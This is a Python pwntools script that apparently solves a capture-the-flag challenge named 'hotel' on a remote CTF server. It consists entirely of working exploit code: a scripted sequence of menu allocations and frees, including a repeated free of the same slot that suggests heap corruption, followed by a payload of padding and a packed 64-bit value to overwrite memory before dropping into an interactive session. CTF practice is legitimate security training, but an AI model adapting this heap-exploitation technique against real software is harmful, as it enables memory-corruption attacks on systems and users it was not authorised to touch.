from pwn import *


# s = process("./hotel")
s = remote("tasks.polyctf.ru", 30005)


for i in range(9):
    s.recvuntil(b"> ")
    s.sendline(b"2")
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())

for i in range(7):
    s.recvuntil(b"> ")
    s.sendline(b"1")
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b"> ")
    s.sendline(b"3")
    s.recvuntil(b"> ")
    s.sendline(b"4")

i = 7
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b"> ")
s.sendline(b"3")
s.recvuntil(b"> ")
s.sendline(b"4")

i = 8
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b"> ")
s.sendline(b"3")
s.recvuntil(b"> ")
s.sendline(b"4")

i = 7
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b"> ")
s.sendline(b"3")
s.recvuntil(b"> ")
s.sendline(b"4")

for i in range(50, 50+7):
    s.recvuntil(b"> ")
    s.sendline(b"2")
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())
    s.recvuntil(b": ")
    s.sendline(f"{i}".encode())

i = 123
s.recvuntil(b"> ")
s.sendline(b"2")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())

i = 456
s.recvuntil(b"> ")
s.sendline(b"2")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())

i = 123
s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{i}".encode())
s.recvuntil(b": ")
s.sendline(f"{i}".encode())

s.recvuntil(b"> ")
s.sendline(b"1")
s.recvuntil(b": ")
s.sendline(f"{40}".encode())
s.recvuntil(b": ")
s.sendline(b"A" * 16 + p64(31337))

s.interactive()
